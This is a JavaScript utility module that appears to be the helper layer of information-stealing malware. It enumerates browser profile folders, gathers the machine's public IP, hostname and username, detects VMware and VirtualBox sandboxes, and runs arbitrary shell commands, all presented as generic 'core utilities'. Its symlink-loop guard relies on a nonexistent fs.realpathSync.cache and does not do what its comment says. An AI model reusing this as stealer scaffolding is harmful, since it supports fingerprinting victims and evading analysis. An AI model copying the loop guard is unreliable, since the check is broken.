/**
 * Core Utilities Module
 * Provides common utility functions used across the application
 */

const fs = require('fs');
const axios = require('axios');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const crypto = require('crypto');

class CoreUtils {
    /**
     * Generate cryptographically secure random ID string
     * @param {number} length - Length of the ID
     * @returns {string} Random ID
     */
    static generateId(length = 10) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const randomBytes = crypto.randomBytes(length);
        return Array.from(randomBytes, byte => chars[byte % chars.length]).join('');
    }

    /**
     * Generate cryptographically secure password
     * @param {number} length - Length of the password
     * @returns {string} Secure random password
     */
    static generatePassword(length = 16) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
        const randomBytes = crypto.randomBytes(length);
        return Array.from(randomBytes, byte => chars[byte % chars.length]).join('');
    }

    /**
     * Extract filename from path
     * @param {string} filePath - Full file path
     * @returns {string} Filename only
     */
    static getFileName(filePath) {
        return filePath.split('\\').pop().split('/').pop();
    }

    /**
     * Recursively read all files in directory with optimized performance
     * @param {string} basePath - Base directory path
     * @param {string} relativePath - Relative path for results
     * @param {Set} visited - Set to track visited directories (prevents infinite loops)
     * @returns {Array<string>} Array of file paths
     */
    static recursiveRead(basePath, relativePath = '', visited = new Set()) {
        const result = [];
        
        // Normalize path separator
        const separator = process.platform === 'win32' ? '\\' : '/';
        if (!basePath.endsWith(separator)) {
            basePath += separator;
        }

        // Prevent infinite loops with symbolic links
        const resolvedPath = fs.realpathSync.cache ? fs.realpathSync.cache[basePath] || basePath : basePath;
        if (visited.has(resolvedPath)) {
            return result;
        }
        visited.add(resolvedPath);

        try {
            const files = fs.readdirSync(basePath, { withFileTypes: true });
            
            for (const file of files) {
                const filePath = basePath + file.name;
                const relativeFilePath = relativePath + file.name;
                
                try {
                    if (file.isDirectory()) {
                        result.push(...this.recursiveRead(filePath, relativeFilePath + separator, visited));
                    } else if (file.isFile()) {
                        result.push(relativeFilePath);
                    }
                } catch (error) {
                    // Skip files that can't be accessed
                    continue;
                }
            }
        } catch (error) {
            // Skip directories that can't be accessed
        }

        return result;
    }

    /**
     * Get browser profiles from path with %PROFILE% placeholder
     * @param {string} pathTemplate - Path template with %PROFILE% placeholder
     * @param {string} name - Profile name
     * @returns {Array<Object>} Array of profile objects
     */
    static getProfiles(pathTemplate, name) {
        const parts = pathTemplate.split('%PROFILE%');
        
        if (parts.length === 1) {
            return [{
                path: pathTemplate,
                name: name
            }];
        }

        if (!fs.existsSync(parts[0])) {
            return [];
        }

        const profiles = [];
        
        try {
            const dirs = fs.readdirSync(parts[0]);
            
            for (const dir of dirs) {
                const fullPath = parts[0] + dir + (parts[1] || '');
                if (fs.existsSync(fullPath)) {
                    profiles.push({
                        path: fullPath,
                        name: `${name} - ${dir}`
                    });
                }
            }
        } catch (error) {
            // Return empty array if can't read directory
        }

        return profiles;
    }

    /**
     * Get public IP address with caching
     * @returns {Promise<string>} Public IP address
     */
    static async getPublicIp() {
        // Cache IP for 5 minutes to avoid repeated requests
        if (this._ipCache && this._ipCacheTime && Date.now() - this._ipCacheTime < 300000) {
            return this._ipCache;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await axios.get('https://api.ipify.org?format=json', {
                timeout: 5000,
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            this._ipCache = response.data.ip;
            this._ipCacheTime = Date.now();
            
            return this._ipCache;
        } catch (error) {
            // Try fallback services with Promise.race for first successful response
            const fallbackServices = [
                'https://icanhazip.com/',
                'https://ipinfo.io/ip'
            ];
            
            const servicePromises = fallbackServices.map(async (service) => {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                
                try {
                    const response = await axios.get(service, {
                        timeout: 3000,
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    const ip = typeof response.data === 'string' ? response.data.trim() : response.data.ip;
                    return ip;
                } catch (err) {
                    clearTimeout(timeoutId);
                    throw err;
                }
            });
            
            try {
                // Use Promise.any to get the first successful response
                const ip = await Promise.any(servicePromises);
                this._ipCache = ip;
                this._ipCacheTime = Date.now();
                return ip;
            } catch (allFailedError) {
                return 'Unknown';
            }
        }
    }

    /**
     * Get hostname
     * @returns {Promise<string>} Hostname
     */
    static async getHostname() {
        try {
            const { stdout } = await exec('hostname');
            return stdout.trim();
        } catch (error) {
            return process.env.COMPUTERNAME || 'Unknown';
        }
    }

    /**
     * Get username
     * @returns {string} Username
     */
    static getUsername() {
        return process.env.USERNAME || 
               process.env.USER || 
               (process.env.USERPROFILE ? process.env.USERPROFILE.split('\\').pop() : 'Unknown');
    }

    /**
     * Check if running in virtual machine (simplified version)
     * @returns {Promise<boolean>} True if likely in VM
     */
    static async isVirtualMachine() {
        try {
            // Simple VM detection based on common VM indicators
            const checks = [
                () => process.env.PROCESSOR_IDENTIFIER?.includes('VMware'),
                () => process.env.COMPUTERNAME?.includes('VM'),
                () => fs.existsSync('C:\\Program Files\\VMware'),
                () => fs.existsSync('C:\\Program Files\\Oracle\\VirtualBox')
            ];

            return checks.some(check => {
                try {
                    return check();
                } catch {
                    return false;
                }
            });
        } catch (error) {
            return false;
        }
    }

    /**
     * Create directory recursively
     * @param {string} dirPath - Directory path to create
     */
    static createDirectoryRecursive(dirPath) {
        try {
            const dir = require('path').dirname(dirPath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        } catch (error) {
            // Ignore errors
        }
    }

    /**
     * Safe file read operation with async support
     * @param {string} filePath - Path to file
     * @param {Object} options - Read options
     * @returns {Promise<Buffer|null>} File contents or null if error
     */
    static async safeReadFileAsync(filePath, options = {}) {
        try {
            return await fs.promises.readFile(filePath, options);
        } catch (error) {
            return null;
        }
    }

    /**
     * Safe file read operation (synchronous)
     * @param {string} filePath - Path to file
     * @param {Object} options - Read options
     * @returns {Buffer|null} File contents or null if error
     */
    static safeReadFile(filePath, options = {}) {
        try {
            return fs.readFileSync(filePath, options);
        } catch (error) {
            return null;
        }
    }

    /**
     * Safe file write operation with async support
     * @param {string} filePath - Path to file
     * @param {Buffer|string} data - Data to write
     * @param {Object} options - Write options
     * @returns {Promise<boolean>} True if successful
     */
    static async safeWriteFileAsync(filePath, data, options = {}) {
        try {
            await this.createDirectoryRecursiveAsync(filePath);
            await fs.promises.writeFile(filePath, data, options);
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Safe file write operation (synchronous)
     * @param {string} filePath - Path to file
     * @param {Buffer|string} data - Data to write
     * @param {Object} options - Write options
     * @returns {boolean} True if successful
     */
    static safeWriteFile(filePath, data, options = {}) {
        try {
            this.createDirectoryRecursive(filePath);
            fs.writeFileSync(filePath, data, options);
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Create directory recursively (async)
     * @param {string} filePath - File path (directory will be extracted)
     */
    static async createDirectoryRecursiveAsync(filePath) {
        try {
            const dir = require('path').dirname(filePath);
            await fs.promises.mkdir(dir, { recursive: true });
        } catch (error) {
            // Ignore errors
        }
    }

    /**
     * Generate secure hash of data
     * @param {string|Buffer} data - Data to hash
     * @param {string} algorithm - Hash algorithm (default: sha256)
     * @returns {string} Hex hash
     */
    static generateHash(data, algorithm = 'sha256') {
        return crypto.createHash(algorithm).update(data).digest('hex');
    }

    /**
     * Sleep for specified milliseconds
     * @param {number} ms - Milliseconds to sleep
     * @returns {Promise} Promise that resolves after delay
     */
    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Execute command with timeout
     * @param {string} command - Command to execute
     * @param {number} timeout - Timeout in milliseconds
     * @returns {Promise<Object>} Command result
     */
    static async executeCommand(command, timeout = 10000) {
        try {
            const { stdout, stderr } = await exec(command, { timeout });
            return { success: true, stdout: stdout.trim(), stderr: stderr.trim() };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Batch process array items with concurrency control
     * @param {Array} items - Items to process
     * @param {Function} processor - Processing function
     * @param {number} concurrency - Max concurrent operations
     * @returns {Promise<Array>} Results array
     */
    static async batchProcess(items, processor, concurrency = 5) {
        const results = new Array(items.length);
        
        // Process items in chunks to control concurrency
        // eslint-disable-next-line no-await-in-loop
        for (let i = 0; i < items.length; i += concurrency) {
            const chunk = items.slice(i, i + concurrency);
            const chunkPromises = chunk.map(async (item, index) => {
                const globalIndex = i + index;
                try {
                    const result = await processor(item, globalIndex);
                    return { index: globalIndex, success: true, result };
                } catch (error) {
                    return { index: globalIndex, success: false, error: error.message };
                }
            });
            
            // eslint-disable-next-line no-await-in-loop
            const chunkResults = await Promise.all(chunkPromises);
            chunkResults.forEach(({ index, success, result, error }) => {
                results[index] = success ? { success: true, result } : { success: false, error };
            });
        }
        
        return results;
    }

    /**
     * Check if file exists asynchronously
     * @param {string} filePath - Path to check
     * @returns {Promise<boolean>} True if file exists
     */
    static async fileExists(filePath) {
        try {
            await fs.promises.access(filePath);
            return true;
        } catch {
            return false;
        }
    }

    /**
     * Get file size safely
     * @param {string} filePath - Path to file
     * @returns {Promise<number>} File size in bytes or 0 if error
     */
    static async getFileSize(filePath) {
        try {
            const stats = await fs.promises.stat(filePath);
            return stats.size;
        } catch {
            return 0;
        }
    }

    /**
     * Rate limiter for function calls
     * @param {Function} fn - Function to rate limit
     * @param {number} delay - Delay between calls in ms
     * @returns {Function} Rate limited function
     */
    static rateLimit(fn, delay) {
        let lastCall = 0;
        return async (...args) => {
            const now = Date.now();
            const timeSinceLastCall = now - lastCall;
            
            if (timeSinceLastCall < delay) {
                await this.sleep(delay - timeSinceLastCall);
            }
            
            lastCall = Date.now();
            return fn(...args);
        };
    }

    /**
     * Retry function with exponential backoff
     * @param {Function} fn - Function to retry
     * @param {number} maxRetries - Maximum number of retries
     * @param {number} baseDelay - Base delay in ms
     * @returns {Promise} Function result
     */
    static async retry(fn, maxRetries = 3, baseDelay = 1000) {
        let lastError;
        
        // eslint-disable-next-line no-await-in-loop
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                return await fn();
            } catch (error) {
                lastError = error;
                
                if (attempt === maxRetries) {
                    throw lastError;
                }
                
                const delay = baseDelay * Math.pow(2, attempt);
                // eslint-disable-next-line no-await-in-loop
                await this.sleep(delay);
            }
        }
    }
}

// Static cache properties
CoreUtils._ipCache = null;
CoreUtils._ipCacheTime = null;

module.exports = CoreUtils;